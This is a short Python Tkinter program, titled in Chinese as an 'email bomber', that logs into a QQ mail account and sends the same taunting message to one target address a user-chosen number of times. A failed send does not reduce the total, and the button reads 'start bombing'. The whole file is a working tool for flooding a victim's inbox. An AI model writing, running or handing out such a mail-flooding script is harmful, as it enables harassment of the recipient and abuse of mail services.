#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-10-11 09:32:02
# @Author  : Your Name (you@example.org)
# @Link    : http://example.org
# @Version : $Id$

from tkinter import *
import smtplib
from email.header import Header
from email.mime.text import MIMEText
from email.utils import parseaddr, formataddr
import threading
 
lock = threading.Lock()
root = Tk()
root.title("邮件轰炸机")
la1 = Label(root,text="输入发送人地址",width=50)
la1.pack()
inp1 = Entry(root,width=30)
inp1.pack()
la2 = Label(root,text="输入授权口令")
la2.pack()
inp2 = Entry(root,show="*")
inp2.pack()
la3 = Label(root,text="输入收件人地址",width=50)
la3.pack()
inp3 = Entry(root,width=30)
inp3.pack()
la4 = Label(root,text="输入发送次数")
la4.pack()
inp4 = Entry(root)
inp4.pack()
la5 = Label(root,text="运行结果")
la5.pack()
tex = Text(root,height=4,width=50)
tex.pack()
 
 
def _format_addr(s):
    name, addr = parseaddr(s)
    return formataddr((Header(name, 'utf-8').encode(), addr))
 
 
def send():
    from_addr = inp1.get()
    password = inp2.get()
    to_addr = inp3.get()
    number = inp4.get()
    smtp_server = "smtp.qq.com"
    tex.delete(1.0,END)
    msg = MIMEText('你是一个上天选中的老司机', 'plain', 'utf-8')
    msg['From'] = _format_addr('一个无聊的Python爱好者 <%s>' % from_addr)
    msg['To'] = _format_addr('上天选中的你 <%s>' % to_addr)
    msg['Subject'] = Header('为了技术献身...', 'utf-8').encode()
    i = 1
    server = smtplib.SMTP(smtp_server, 25)
    server.starttls()
    server.login(from_addr, password)
    while i<int(number):
        try:
            server.sendmail(from_addr, [to_addr], msg.as_string())
            lock.acquire()
            tex.insert(END,"正在发送第%d封邮件\n"%i)
            lock.release()
        except:
            lock.acquire()
            tex.insert(END,"第%d封邮件发送失败\n"%i)
            lock.release()
            i=i-1
        i=i+1
    server.quit()
 
 
but = Button(root,text="开始轰炸",command=send)
but.pack()
mainloop()
